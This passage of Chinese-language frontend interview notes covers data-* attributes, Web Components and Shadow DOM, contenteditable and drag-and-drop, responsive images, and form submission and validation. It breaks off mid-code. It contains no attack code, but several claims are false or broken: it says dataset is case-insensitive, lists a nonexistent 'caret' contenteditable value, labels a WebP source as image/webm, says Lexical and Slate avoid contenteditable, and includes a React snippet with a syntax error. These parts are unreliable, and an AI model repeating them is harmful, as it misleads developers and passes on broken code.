# Section 12: data-* 属性

## 12.1 概念定义

`data-*` 属性允许在 HTML 元素上存储自定义数据，供 JavaScript 访问：

```html
<button
  data-id="123"
  data-name="Alice"
  data-user='{"age":25}'
  data-list="a,b,c"
  class="btn"
>点击</button>
```

## 12.2 dataset API vs getAttribute

```javascript
const btn = document.querySelector('.btn');

// dataset API（驼峰式访问）
console.log(btn.dataset.id);       // '123'（字符串）
console.log(btn.dataset.name);     // 'Alice'
console.log(btn.dataset.user);     // '{"age":25}'（字符串，需 JSON.parse）
console.log(btn.dataset.list);    // 'a,b,c'
console.log(btn.dataset);          // DOMStringMap { id: '123', name: 'Alice', ... }

// 属性方式访问（烤肉串式）
console.log(btn.getAttribute('data-id')); // '123'

// 写入
btn.dataset.role = 'admin';
// 实际渲染为 data-role="admin"

// 删除
delete btn.dataset.id;
btn.removeAttribute('data-id');
```

### 命名转换规则

```
data-user-name  →  dataset.userName（烤肉串 → 驼峰）
data-userId     →  dataset.userId（保持）
data-item       →  dataset.item
```

## 12.3 存储模式与类型转换

### 基本类型

```javascript
// 数字 → 自动转字符串
el.dataset.count = 42;
el.dataset.count; // '42'

// 布尔 → 字符串
el.dataset.loading = true;
el.dataset.loading; // 'true'

// JSON → 需要手动序列化
el.dataset.config = JSON.stringify({ theme: 'dark' });
JSON.parse(el.dataset.config); // { theme: 'dark' }
```

### 存储模式对比

| 存储方式 | 适用场景 | 特点 |
|---------|---------|------|
| `data-id="123"` | 简单数字 ID | 直接访问，最快 |
| `data-tags="a,b,c"` | 简单列表 | split(',') 解析 |
| `data-config='{"key":"value"}'` | 复杂对象 | JSON.stringify/parse |
| `data-user-id` | 复合命名 | 驼峰式访问 |

## 12.4 data-* 与 React/Vue

### React 中的 data 属性

```tsx
// React 中 data-* 属性需用 data- 前缀
<button
  data-id={item.id}
  data-action="delete"
  onClick={(e) => {
    const id = e.currentTarget.dataset.id;
    const action = e.currentTarget.dataset.action;
  })}
>
  删除
</button>
```

### Vue 中的 data 属性

```vue
<template>
  <button
    :data-id="item.id"
    @click="handleClick"
  >
    删除
  </button>
</template>

<script setup>
const handleClick = (e) => {
  const id = e.target.dataset.id; // 驼峰式访问
};
</script>
```

### TypeScript 类型定义

```typescript
// 扩展 HTMLElement dataset 类型
interface HTMLElement {
  dataset: DOMStringMap & {
    id?: string;
    action?: string;
    config?: string;
  };
}

// 或使用接口合并
declare global {
  interface HTMLElement {
    dataset: HTMLElement['dataset'] & {
      customId?: string;
    };
  }
}
```

## 12.5 CSS 选择器中的 data-*

```css
/* 精确匹配 */
button[data-id="123"] {
  color: red;
}

/* 属性存在（不关心值） */
[data-active] {
  background: blue;
}

/* 属性值包含 */
[data-type~="primary"] {
  font-weight: bold;
}

/* 开头匹配 */
[class^="btn-"] {
  /* 以 btn- 开头的 class */
}

/* CSS 变量与 data- 结合 */
[data-theme="dark"] {
  --bg: #1a1a1a;
  --text: #fff;
}
```

## 12.6 data-* 与 ARIA 的关系

```html
<!-- data-* 存储状态，aria-* 声明语义 -->
<div
  role="button"
  data-status="loading"
  aria-pressed="false"
  aria-live="polite"
>
  提交
</div>
```

| 属性 | 用途 | 访问方式 |
|------|------|---------|
| `data-*` | 存储应用状态/元数据 | `element.dataset` |
| `aria-*` | 声明无障碍语义（屏幕阅读器） | `element.getAttribute('aria-*')` |

## 12.7 常见陷阱

```javascript
// 陷阱1: 直接赋值对象（不会自动 JSON.stringify）
el.dataset.config = { theme: 'dark' };
el.dataset.config; // '[object Object]' ❌

// ✅ 正确
el.dataset.config = JSON.stringify({ theme: 'dark' });

// 陷阱2: 命名冲突
// data-id vs data-ID：dataset 不区分大小写
el.dataset.id = '1';
el.dataset.ID; // '1' — 同名！

// 陷阱3: 复杂数据结构
// 不要在 data-* 中存储大量数据
// 适合：简单配置、状态、ID
// 不适合：大对象、函数、循环引用
```

## 12.8 面试 follow-up 问题

### Q1: `dataset.id` 和 `getAttribute('data-id')` 有什么区别？

**答案：**
- `dataset.id`：返回 DOMStringMap，自动处理命名转换（data-id → id，data-user-id → userId）
- `getAttribute('data-id')`：返回原始字符串，不做转换

```javascript
el.dataset.id;          // '123'
el.getAttribute('data-id'); // '123'

// 区别在于命名转换
el.dataset.userId;       // 访问 data-user-id
el.getAttribute('data-user-id'); // 直接访问原始属性
```

---

### Q2: data-* 属性和 React state/props 的区别和使用场景？

**答案：**
| 场景 | 推荐 | 原因 |
|------|------|------|
| 简单 UI 状态（如展开/收起） | `data-*` | 纯 HTML/原生 JS 即可实现 |
| 组件内部状态 | `useState` / `ref` | React 响应式渲染 |
| 跨组件共享数据 | `useContext` / `zustand` | 全局状态管理 |
| DOM 操作需要的数据 | `data-*` | 如拖拽、第三方库集成 |
| 动态样式 | CSS 变量 + `data-*` | `div[data-theme="dark"]` |

---

### Q3: data-* 属性在 SSR 场景下有什么注意事项？

**答案：**
1. **Hydration 不匹配**：SSR 和客户端 dataset 访问方式相同，但注意 data-* 必须是字符串
2. **序列化**：SSR 时，`data-config` 必须是 JSON 字符串（`JSON.stringify`），而非对象
3. **安全性**：data-* 内容会出现在 HTML 中，**不要存放敏感信息**（token、密码）
4. **SEO**：data-* 属性对爬虫无意义（不是语义标记），用于存储而非展示内容

---

> 📚 参考：
> - https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset
> - https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/data-*
> - https://blog.csdn.net/weixin_44387024/article/details/126296426

---

### 13. Web Component / Shadow DOM / Slot

#### 13.1 定义与核心原理

**Web Component** 是一套原生 Web 平台技术栈，包含三个核心规范：
- **Custom Elements**：创建自定义 HTML 标签（`class MyElement extends HTMLElement`）
- **Shadow DOM**：样式和 DOM 结构的隔离封装
- **HTML Templates**（`<template>` + `<slot>`）：可复用的组件结构模板

**核心价值：**
- 跨框架复用（Angular / React / Vue / 原生均可使用）
- 原生支持，无需构建工具
- 样式天然隔离，不会污染全局

#### 13.2 Custom Elements 生命周期详解

```javascript
class MyCounter extends HTMLElement {
  constructor() {
    super();
    // ① 在构造函数中初始化：创建 Shadow DOM，绑定事件监听
    this.attachShadow({ mode: 'open' });
    this._count = 0;
  }

  // ② 元素首次插入 DOM 时调用
  connectedCallback() {
    this.shadowRoot.innerHTML = `
      <button id="dec">-</button>
      <span id="count">${this._count}</span>
      <button id="inc">+</button>
    `;
    this.shadowRoot.querySelector('#inc').onclick = () => this.#increment();
    this.shadowRoot.querySelector('#dec').onclick = () => this.#decrement();
  }

  // ③ 元素从 DOM 中移除时调用
  disconnectedCallback() {
    console.log('元素已从 DOM 移除，清理资源');
  }

  // ④ 元素属性变化时调用（需在 static observedAttributes 中声明监听哪些属性）
  attributeChangedCallback(name, oldValue, newValue) {
    if (oldValue === newValue) return;
    if (name === 'count') {
      this._count = Number(newValue);
      this.shadowRoot.querySelector('#count').textContent = newValue;
    }
  }

  // ⑤ observedAttributes 静态 getter：声明要监听哪些属性
  static get observedAttributes() { return ['count']; }

  // ⑥ 元素移动到新文档时调用（极少用）
  adoptedCallback() {}

  #increment() {
    this._count++;
    this.setAttribute('count', this._count);
  }
  #decrement() {
    this._count--;
    this.setAttribute('count', this._count);
  }
}

// 注册（标签名必须包含连字符，如 x- / my-，避免与原生标签冲突）
customElements.define('my-counter', MyCounter);
```

```html
<!-- 使用 -->
<my-counter count="0"></my-counter>
<!-- JS 动态控制 -->
<script>
  const counter = document.querySelector('my-counter');
  counter.setAttribute('count', '10');
  // 观察变化：attributeChangedCallback 触发
</script>
```

#### 13.3 Shadow DOM 样式隔离原理

**什么是 Shadow DOM？**
每个 Shadow DOM 有一个**Shadow Root**（根节点），Shadow Root 内的 DOM 形成一棵独立的子树，与主文档 DOM 完全隔离。

**样式渗透规则：**

```html
<!-- 外部 CSS 无法渗透进 Shadow DOM -->
<style> my-card { color: red; } </style>  <!-- ❌ 不生效，Shadow DOM 隔离 -->

<!-- :host 伪类：选择自定义元素本身（Shadow DOM 根元素） -->
<style>
  :host { display: block; }
  :host([disabled]) { opacity: 0.5; }       /* 根据宿主属性样式化 */
  :host-context(.dark-theme) { color: white; } /* 根据祖先.is-dark 样式化 */
</style>

<!-- ::slotted()：选择被插入的插槽内容（只能做有限样式） -->
<style>
  ::slotted(*) { color: inherit; }      /* ✅ 可样式化 */
  ::slotted(h1) { font-size: 2em; }    /* ✅ 可样式化 */
  ::slotted(h1 .title) { ... }        /* ❌ 无法穿透插槽，CSS 选择器不支持 */
</style>

<!-- CSS 变量（Custom Properties）：跨 Shadow Boundary 传递样式 -->
<!-- 父组件： -->
<my-card style="--card-bg: #f0f0f0; --card-padding: 16px;">

<!-- Shadow DOM 内部： -->
<div class="card" style="background: var(--card-bg); padding: var(--card-padding);">
```

#### 13.4 Slot 插槽机制详解

**默认插槽 vs 具名插槽：**

```html
<my-layout>
  <h1 slot="header">页面标题</h1>      <!-- 匹配 name="header" 的插槽 -->
  <p>正文内容</p>                       <!-- 进入默认插槽（无 name 属性） -->
  <p slot="footer">页脚</p>           <!-- 匹配 name="footer" 的插槽 -->
</my-layout>
```

```javascript
class MyLayout extends HTMLElement {
  connectedCallback() {
    this.attachShadow({ mode: 'open' }).innerHTML = `
      <header><slot name="header"></slot></header>
      <main><slot></slot></main>
      <footer><slot name="footer"></slot></footer>
    `;
  }
}
```

**插槽内容分发规则：**
- 有 `slot="X"` 属性的节点 → 进入 `name="X"` 的具名插槽
- 无 `slot` 属性的节点 → 进入默认 `<slot>`（无名插槽）
- 多个节点指定同一 `slot` → 按文档顺序依次填入
- 插槽内容**仍属于主文档**（可被主文档 CSS 样式化，但受 `::slotted()` 限制）

**插槽事件（面试加分项）：**
```javascript
// slotchange 事件：插槽内容变化时触发
const slot = this.shadowRoot.querySelector('slot');
slot.addEventListener('slotchange', (e) => {
  const nodes = e.target.assignedNodes(); // 获取分配到此插槽的节点
  console.log('插槽内容已变化，当前节点数:', nodes.length);
});
```

#### 13.5 Shadow DOM vs iframe 对比

| 维度 | Shadow DOM | iframe |
|------|-----------|--------|
| 隔离程度 | 样式隔离 + DOM 隔离（节点不在主文档树中） | 完全隔离（独立 document/global/window） |
| 通信方式 | 通过 props/events/CSS 变量 | postMessage |
| 性能开销 | 极小（无额外文档解析） | 大（独立 HTML 解析、JS 上下文） |
| URL 共享 | 共享父页面 URL/History/Cookie | 独立 URL（可设 src） |
| 样式继承 | 可通过 CSS 变量穿透 | 不行（除非 postMessage 通知） |
| SEO | 可被爬虫解析（主文档 HTML 包含组件标签） | iframe 内容取决于是否有 robots 访问权限 |
| 适用场景 | UI 组件库、跨框架复用 | 第三方内容隔离（广告/沙箱）、多团队独立部署 |

#### 13.6 Web Component 与 Vue Slot / React Children 对比

| 维度 | Web Component Slot | Vue Slot | React Children |
|------|--------------------|---------|----------------|
| 分发依据 | `slot` 属性名 | `v-slot` 指令 | 组件 JSX 中的位置 |
| 样式隔离 | ✅ Shadow DOM | ❌ 透传（可用 scoped CSS 限制） | ❌ 透传（可用 CSS Modules） |
| 跨框架 | ✅ 原生，任意框架使用 | ❌ 仅 Vue | ❌ 仅 React |
| 默认内容 | `<slot>默认文本</slot>` | `<slot>默认文本</slot>` | `props.children ?? 默认内容` |
| 作用域插槽 | ❌ 不支持（但可通过 props 实现） | ✅ 支持 | ✅ render props |

#### 13.7 高频面试追问

**Q1：Web Component 的 `customElements.define('my-element', ...)` 中，标签名必须包含连字符，这是为什么？**
> HTML 规范要求：所有自定义标签名必须包含连字符（`-`），以确保与未来可能加入的原生 HTML 标签不会冲突。例如 `<my-element>` 不可能与原生标签冲突，而 `<customelement>` 可能在未来原生支持该标签时产生歧义。这是 W3C 的刻意设计——通过命名空间约定避免冲突。

**Q2：Shadow DOM 的样式隔离是 100% 安全的吗？有什么方式可以穿透？**
> 不是 100%。穿透方式：
> 1. **CSS 变量（Custom Properties）**：`--color: red` 可穿过 Shadow Boundary
> 2. **`:host-context()`**：根据祖先元素匹配 Shadow Root
> 3. **JavaScript**：在 open 模式下可通过 `element.shadowRoot` 直接操作
> 4. **`<link rel="stylesheet">`（内部）**：外部 stylesheet 无法穿透，但内部 `@import` 可以从内部加载
> 如果需要完全隔离（如第三方组件），需用 `mode: 'closed'`（但仍有 `querySelector` 绕过方式）。

> 📚 参考：
> - [MDN — Web Components](https://developer.mozilla.org/en-US/docs/Web/Web_Components)
> - [MDN — Using custom elements](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_custom_elements)
> - [MDN — Using shadow DOM](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM)
> - [Google Developers — Web Components](https://developers.google.com/web/fundamentals/web-components)

---

# Section 14: contenteditable 与 draggable

## 14.1 contenteditable 可编辑内容

### 基本用法

```html
<!-- 使元素内容可编辑 -->
<div contenteditable="true">点击编辑这段文字</div>

<!-- 纯文本编辑（不解析 HTML） -->
<div contenteditable="plaintext-only">纯文本</div>

<!-- inherit：继承父元素 -->
<div contenteditable="true">
  <span contenteditable="inherit">继承父级</span>
</div>
```

### contenteditable 值

| 值 | 行为 |
|---|------|
| `true` / `"true"` | 可编辑 |
| `false` / `"false"` | 不可编辑 |
| `"plaintext-only"` | 仅纯文本（Chrome 78+） |
| `"caret"` | 仅可设置光标位置（不插入文本） |
| `"inherit"` | 继承父元素值 |

### JS 操作

```javascript
const editor = document.querySelector('[contenteditable]');

// 监听输入
editor.addEventListener('input', () => {
  console.log('内容已改变:', editor.innerHTML);
  console.log('纯文本:', editor.innerText);
});

// 粘贴为纯文本（阻止格式化）
editor.addEventListener('paste', (e) => {
  e.preventDefault();
  const text = e.clipboardData.getData('text/plain');
  document.execCommand('insertText', false, text);
});

// 只读切换
editor.contentEditable = 'false'; // 禁用编辑
editor.contentEditable = 'true';  // 启用编辑
editor.contentEditable = 'inherit'; // 继承

// 检测是否可编辑
console.log(editor.isContentEditable); // true/false
```

## 14.2 Selection API 与 Range

现代富文本编辑使用 Selection API 替代 `execCommand`：

```javascript
// 获取选区
const selection = window.getSelection();

// 获取 Range
const range = selection.getRangeAt(0);

// 选中所有内容
const allRange = document.createRange();
allRange.selectNodeContents(editor);
selection.removeAllRanges();
selection.addRange(allRange);

// 插入文本（不使用 execCommand）
function insertText(text) {
  const selection = window.getSelection();
  if (!selection.rangeCount) return;

  const range = selection.getRangeAt(0);
  range.deleteContents();
  range.insertNode(document.createTextNode(text));
  range.collapse(false);
}

// 获取光标位置
function getCaretPosition(element) {
  let position = 0;
  const selection = window.getSelection();
  if (selection.rangeCount > 0) {
    const range = selection.getRangeAt(0);
    const preRange = range.cloneRange();
    preRange.selectNodeContents(element);
    preRange.setEnd(range.startContainer, range.startOffset);
    position = preRange.toString().length;
  }
  return position;
}

// 设置光标位置
function setCaretPosition(element, position) {
  const range = document.createRange();
  const selection = window.getSelection();

  let charCount = 0;
  function traverseNodes(node) {
    if (node.nodeType === Node.TEXT_NODE) {
      const nextCount = charCount + node.textContent.length;
      if (position <= nextCount) {
        range.setStart(node, position - charCount);
        range.collapse(true);
        return true;
      }
      charCount = nextCount;
    } else {
      for (const child of node.childNodes) {
        if (traverseNodes(child)) return true;
      }
    }
    return false;
  }

  traverseNodes(element);
  selection.removeAllRanges();
  selection.addRange(range);
}
```

## 14.3 execCommand（已废弃，但需了解）

```javascript
// ⚠️ execCommand 已废弃，但面试仍会问
document.execCommand('bold');          // 加粗
document.execCommand('italic');          // 斜体
document.execCommand('underline');      // 下划线
document.execCommand('insertOrderedList'); // 有序列表
document.execCommand('insertUnorderedList'); // 无序列表

// 选中文本后执行
const selection = window.getSelection();
if (selection.toString()) {
  document.execCommand('copy');         // 复制
  document.execCommand('paste');        // 粘贴
}
```

现代替代方案：
- `document.execCommand` → Selection API + Range
- `queryCommandEnabled` → `selection.rangeCount > 0`
- 建议使用 Tiptap/Lexical 等编辑器库

## 14.4 draggable 拖拽属性

### 基本用法

```html
<!-- 让元素可拖拽 -->
<div draggable="true">拖拽我</div>

<!-- 图片默认可拖拽，且会显示拖拽预览 -->
<img src="photo.jpg" alt="图片" draggable="true">

<!-- 链接默认可拖拽（拖拽 URL） -->
<a href="https://example.com" draggable="true">链接</a>
```

### 拖拽事件顺序

```
dragstart → drag → dragenter → dragover → dragleave → drop → dragend
   │        │       │           │
   │        │       │           └── 持续触发（需要 preventDefault 允许放置）
   │        │       │
   │        │       └── 进入放置目标
   │        │
   └── 开始拖拽（设置 dataTransfer）
```

### DataTransfer 对象

```javascript
el.addEventListener('dragstart', (e) => {
  // 设置拖拽数据
  e.dataTransfer.setData('text/plain', '纯文本');
  e.dataTransfer.setData('text/html', '<b>HTML内容</b>');
  e.dataTransfer.setData('text/uri-list', 'https://example.com');
  e.dataTransfer.setData('application/json', JSON.stringify({ id: 1 }));

  // 设置拖拽效果
  e.dataTransfer.effectAllowed = 'copyMove'; // 允许复制/移动

  // 设置自定义拖拽图标
  const img = new Image();
  img.src = 'drag-icon.png';
  e.dataTransfer.setDragImage(img, 10, 10);
});

el.addEventListener('drop', (e) => {
  e.preventDefault(); // 阻止默认行为
  const text = e.dataTransfer.getData('text/plain');
  const json = JSON.parse(e.dataTransfer.getData('application/json'));
  const files = e.dataTransfer.files; // 拖拽文件
  const urls = e.dataTransfer.getData('text/uri-list'); // URL 列表
});
```

### effectAllowed 值

| 值 | 说明 |
|---|------|
| `copy` | 仅复制 |
| `move` | 仅移动 |
| `copyMove` | 复制或移动 |
| `link` | 仅创建链接 |
| `all` | 全部允许 |
| `none` | 不允许 |

### dropEffect 值（放置目标）

| 值 | 说明 |
|---|------|
| `copy` | 复制到目标 |
| `move` | 移动到目标 |
| `link` | 创建链接 |
| `none` | 不允许（停止） |

## 14.5 拖拽文件上传

```javascript
// 拖拽文件上传区域
const dropZone = document.getElementById('drop-zone');

dropZone.addEventListener('dragover', (e) => {
  e.preventDefault(); // 允许放置
  e.dataTransfer.dropEffect = 'copy';
  dropZone.classList.add('drag-over');
});

dropZone.addEventListener('dragleave', () => {
  dropZone.classList.remove('drag-over');
});

dropZone.addEventListener('drop', (e) => {
  e.preventDefault();
  dropZone.classList.remove('drag-over');

  const files = e.dataTransfer.files;
  for (const file of files) {
    if (file.type.startsWith('image/')) {
      uploadFile(file);
    }
  }
});
```

## 14.6 contenteditable vs contenteditable + 设计模式

| 实现方式 | 适用场景 | 复杂度 | 稳定性 |
|---------|---------|--------|--------|
| 原生 `contenteditable` | 简单文本编辑 | 低 | 差（浏览器行为不一致） |
| `execCommand` 封装 | 中等复杂度富文本 | 中 | 差（已废弃） |
| Selection API + Range | 自定义富文本编辑器 | 高 | 良好 |
| Tiptap / Lexical / Slate | 生产级富文本编辑器 | 高 | 优秀 |
| 原生拖拽 API | 简单拖拽排序 | 低 | 良好 |
| react-dnd / @dnd-kit | React 拖拽组件 | 中 | 优秀 |

## 14.7 常见陷阱

```javascript
// 陷阱1: contenteditable 内部可嵌套其他 HTML
// 粘贴时可能带入不需要的格式
editor.addEventListener('paste', (e) => {
  e.preventDefault();
  const text = e.clipboardData.getData('text/plain');
  document.execCommand('insertText', false, text);
});

// 陷阱2: dragstart 中没设置数据导致 drop 失败
el.addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'data'); // 必须设置！
});

// 陷阱3: drop 目标没有 preventDefault
// 浏览器会打开链接或导航
dropTarget.addEventListener('dragover', (e) => {
  e.preventDefault(); // 必须！
});

// 陷阱4: iOS 不支持原生拖拽
// 需要使用 Pointer Events + Touch Events
// 或使用 @dnd-kit 等跨平台库
```

## 14.8 面试 follow-up 问题

### Q1: contenteditable 和 `<input>` / `<textarea>` 的区别是什么？

**答案：**
| 维度 | contenteditable | input/textarea |
|------|----------------|----------------|
| 容器 | 任意块级元素 | 专用表单元素 |
| 格式 | 可包含 HTML（富文本） | 纯文本 |
| 表单集成 | ❌ 不参与表单提交 | ✅ 参与 |
| 样式 | 任意 CSS 样式 | 浏览器默认样式 |
| 复杂度 | 高（需自己处理光标/选区） | 低 |
| 适用场景 | 富文本编辑器、代码块 | 普通文本输入 |

---

### Q2: 如何实现一个自定义的富文本编辑器（不使用 contenteditable）？

**答案：**
现代富文本编辑器（如 Lexical、Slate）不使用 contenteditable，而是：
1. **自定义数据模型**：存储为 JSON/Delta 格式（如 `{ type: 'paragraph', children: [...] }`）
2. **React 组件渲染**：每个节点是 React 组件，内容是受控的
3. **Selection 追踪**：通过 Selection API 追踪光标位置
4. **操作转换（OT/CRDT）**：处理并发编辑冲突

架构示例：
```
数据模型（JSON/Delta）
    ↓
渲染器（React 组件树）
    ↓
Selection（光标位置）
    ↓
编辑器核心（输入事件 → 操作 → 更新模型 → 重新渲染）
```

---

### Q3: 原生 HTML5 拖拽 API 有哪些局限性？实际项目中如何解决？

**答案：**
局限性：
1. **iOS 不支持**：移动端无法使用
2. **自定义拖拽预览困难**：只能通过 setDragImage
3. **跨 iframe 拖拽问题**：DataTransfer 跨域限制
4. **拖拽事件触发时机不精确**：dragover 节流问题

解决方案：
- 移动端：使用 Pointer Events + Touch Events 自定义实现
- 复杂场景：使用 `@dnd-kit/core`（React）/ `react-dnd` / `@dnd-kit/sortable`
- 拖拽排序：`@dnd-kit/sortable` 提供跨浏览器一致的体验

---

> 📚 参考：
> - https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Editable_content
> - https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API
> - https://github.com/nickzuber/slate （Slate 编辑器）
> - https://github.com/ueberdosis/tiptap （Tiptap 编辑器）

---

### 15. picture / source / audio / video 多媒体

#### 15.1 picture 响应式图片

```html
<picture>
  <!-- 浏览器逐个检查 source，找到第一个匹配的 -->
  <!-- WebP 格式，优先 -->
  <source
    srcset="image.avif"
    type="image/avif"
  >
  <source
    srcset="image.webp"
    type="image/webm"
  >
  <!-- 大屏幕使用 2x 图片 -->
  <source
    srcset="image-800.jpg 1x, image-1600.jpg 2x"
    media="(min-width: 800px)"
  >
  <!-- 默认图片（兜底） -->
  <img
    src="image.jpg"
    alt="描述"
    width="800"
    height="600"
    loading="lazy"
    decoding="async"
  >
</picture>
```

**img srcset vs picture：**
- `img srcset`：在单个 img 元素内指定多个图片源
- `picture`：用 media 查询或 type 判断选择不同图片（适合 art direction 或格式协商）

#### 15.2 audio / video

见 1.2 节多媒体标签。

---

# Section 16: Form 表单提交原理

## 16.1 表单属性详解

### action / method / enctype 三剑客

```html
<form
  action="/api/submit"
  method="POST"
  enctype="application/x-www-form-urlencoded"
  target="_blank"
  novalidate
>
```

| 属性 | 作用 | 值 |
|------|------|-----|
| `action` | 表单提交的 URL | URL 字符串 |
| `method` | HTTP 方法 | `GET` / `POST` |
| `enctype` | 编码类型 | 见下表 |
| `target` | 提交后响应显示位置 | `_self` / `_blank` / iframe name |
| `novalidate` | 禁用原生验证 | boolean |

**method 取值对比：**

| 方法 | 数据位置 | 大小限制 | 安全性 | 缓存 |
|------|----------|----------|--------|------|
| `GET` | URL query string `?key=value` | ~2KB | ❌ 参数暴露在 URL | ✅ 可缓存 |
| `POST` | Request body | 无限制 | ✅ 稍好 | ❌ 不可缓存 |

## 16.2 enctype 编码类型详解

| enctype | 编码方式 | 适用场景 | 示例 |
|---------|----------|----------|------|
| `application/x-www-form-urlencoded` | URL 编码（默认） | 普通文本表单 | `name=John&age=30` |
| `multipart/form-data` | 多部分编码（边界分隔） | **含文件上传** | 二进制分块 |
| `text/plain` | 纯文本（空格转+） | 调试/简单文本 | 不推荐 |

### multipart/form-data 请求体结构

```
-----------------------------14462084971952162691234567890
Content-Disposition: form-data; name="username"

John
-----------------------------14462084971952162691234567890
Content-Disposition: form-data; name="avatar"; filename="avatar.png"
Content-Type: image/png

[二进制文件内容]
-----------------------------14462084971952162691234567890
Content-Disposition: form-data; name="bio"

Hello, I'm John!
-----------------------------14462084971952162691234567890--
```

## 16.3 文件上传机制

### 原生文件上传表单

```html
<form method="POST" enctype="multipart/form-data" action="/api/upload">
  <input type="file" name="avatar" accept="image/png,image/jpeg" />
  <input type="file" name="gallery" multiple accept="image/*" />
  <button type="submit">Upload</button>
</form>
```

**accept 属性扩展名和 MIME 类型：**
```html
<input type="file" accept=".pdf,.doc,.docx" />                    <!-- 扩展名 -->
<input type="file" accept="image/*" />                             <!-- 所有图片 -->
<input type="file" accept="application/pdf" />                    <!-- PDF -->
```

### 文件上传的请求流程

```
用户选择文件 → 表单 enctype="multipart/form-data" →
 浏览器构建 multipart body →
  每个字段作为独立 part 发送（边界字符串分隔） →
  服务器解析 multipart body →
  提取文件二进制数据写入临时目录
```

**后端解析 multipart（Node.js 示例）：**
```javascript
import formidable from 'formidable';

const form = formidable({
  uploadDir: './uploads',
  keepExtensions: true,
  maxFileSize: 5 * 1024 * 1024, // 5MB
});

form.parse(req, (err, fields, files) => {
  console.log(files.avatar[0].originalFilename);
  console.log(files.avatar[0].filepath);
});
```

## 16.4 FormData API 与 fetch

### FormData 基础

```javascript
const form = document.querySelector('form');
const formData = new FormData(form); // 直接从表单构建

// 手动添加字段
const data = new FormData();
data.append('username', 'john');
data.append('avatar', fileInput.files[0]);
data.append('tags', 'dev');
data.append('tags', 'frontend'); // 同一字段多个值

// 发送
fetch('/api/submit', {
  method: 'POST',
  body: data, // ❌ 不要设置 Content-Type！浏览器自动设置 multipart/form-data
});
```

```typescript
// TypeScript 类型
interface UploadPayload {
  username: string;
  avatar: File;
  bio: string;
}

const submitForm = async (payload: UploadPayload) => {
  const formData = new FormData();
  formData.append('username', payload.username);
  formData.append('avatar', payload.avatar);
  formData.append('bio', payload.bio);

  const res = await fetch('/api/upload', {
    method: 'POST',
    body: formData,
    // 注意：不要写 headers 的 Content-Type
    // 浏览器会自动添加正确的 Content-Type 和 boundary
  });

  return res.json();
};
```

### React 中的表单处理

```tsx
import { useState } from 'react';

const UploadForm = () => {
  const [file, setFile] = useState<File | null>(null);
  const [uploading, setUploading] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setUploading(true);

    const formData = new FormData(e.currentTarget);
    // formData 已包含所有表单字段

    try {
      const res = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
      });
      const result = await res.json();
      console.log(result);
    } finally {
      setUploading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="text" name="title" required />
      <input
        type="file"
        name="document"
        accept=".pdf,.docx"
        onChange={(e) => setFile(e.target.files?.[0] ?? null)}
      />
      {file && <p>Selected: {file.name} ({(file.size / 1024).toFixed(1)} KB)</p>}
      <button type="submit" disabled={uploading}>
        {uploading ? 'Uploading...' : 'Submit'}
      </button>
    </form>
  );
};
```

## 16.5 原生表单验证

### 验证属性

| 属性 | 作用 | 示例 |
|------|------|------|
| `required` | 必填 | `<input required>` |
| `minlength` / `maxlength` | 字符长度限制 | `<input minlength="3" maxlength="20">` |
| `min` / `max` | 数值/日期范围 | `<input type="number" min="1" max="100">` |
| `pattern` | 正则表达式验证 | `<input pattern="[A-Za-z]+">` |
| `type` | 内置类型校验 | `email`, `url`, `tel`, `number` |
| `step` | 数值步长 | `<input type="number" step="0.01">` |

```html
<!-- 完整示例 -->
<form id="signup" novalidate>
  <input
    type="email"
    name="email"
    required
    placeholder="your@email.com"
  />

  <input
    type="password"
    name="password"
    required
    minlength="8"
    pattern="^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$"
    title="At least 8 chars with letters and numbers"
  />

  <input
    type="url"
    name="website"
    placeholder="https://example.com"
  />

  <input
    type="number"
    name="age"
    min="18"
    max="120"
  />

  <button type="submit">Sign up</button>
</form>
```

### 自定义验证消息

```javascript
const input = document.querySelector('input[name="password"]');

input.addEventListener('invalid', (e) => {
  // 阻止默认消息
  e.preventDefault();

  // 自定义消息
  if (input.validity.valueMissing) {
    input.setCustomValidity('Password is required');
  } else if (input.validity.tooShort) {
    input.setCustomValidity(`Need ${input.minLength} chars, you entered ${input.value.length}`);
  } else if (input.validity.patternMismatch) {
    input.setCustomValidity('Must contain letters and numbers');
  }
  // 显示自定义消息
  input.reportValidity();
});

input.addEventListener('input', () => {
  input.setCustomValidity(''); // 清除错误消息
});
```

```typescript
// ValidityState 接口
input.validity.valid;                    // 是否全部通过
input.validity.valueMissing;              // required 且为空
input.validity.typeMismatch;              // 类型不匹配 (email/url)
input.validity.patternMismatch;           // 正则不匹配
input.validity.tooLong;                   // 超过 maxlength
input.validity.tooShort;                  // 低于 minlength
input.validity.rangeUnderflow;            // 低于 min
input.validity.rangeOverflow;              // 超过 max
input.validity.stepMismatch;              // 不符合 step
input.validity.badInput;                  // 输入类型错误
input.validity.customError;               // 有 setCustomValidity
```

## 16.6 preventDefault vs return false

### 对比表

| 行为 | 阻止默认行为 | 阻止冒泡 | 兼容性 |
|------|------------|----------|--------|
| `e.preventDefault()` | ✅ | ❌ | 所有浏览器 |
| `e.stopPropagation()` | ❌ | ✅ | 所有浏览器 |
| `return false` | ✅ | ❌（在 jQuery 中同时阻止冒泡） | jQuery only |
| `onclick="return false"` | ✅ 表单不提交 | ✅ 事件不冒泡 | 原生 HTML |

```html
<!-- 原生事件中 return false 等价于 preventDefault -->
<form onsubmit="return validate()">
  <!-- return false → 阻止提交 -->
</form>

<!-- 阻止默认行为但不阻止冒泡 -->
<form onsubmit="handleSubmit(event)">
```

```javascript
// 表单提交事件
form.addEventListener('submit', (e) => {
  e.preventDefault();           // ✅ 阻止浏览器默认提交
  // 自定义提交逻辑
  customSubmit();
});

// ❌ return false 在 addEventListener 中无效！
form.addEventListener('submit', () => {
  return false; // 不起作用！
});

// ✅ 正确：使用 preventDefault
```

**实际场景选择：**

```typescript
const onFormSubmit = (e: SubmitEvent) => {
  if (!validateForm()) {
    e.preventDefault(); // 验证失败，阻止提交
    return;
  }
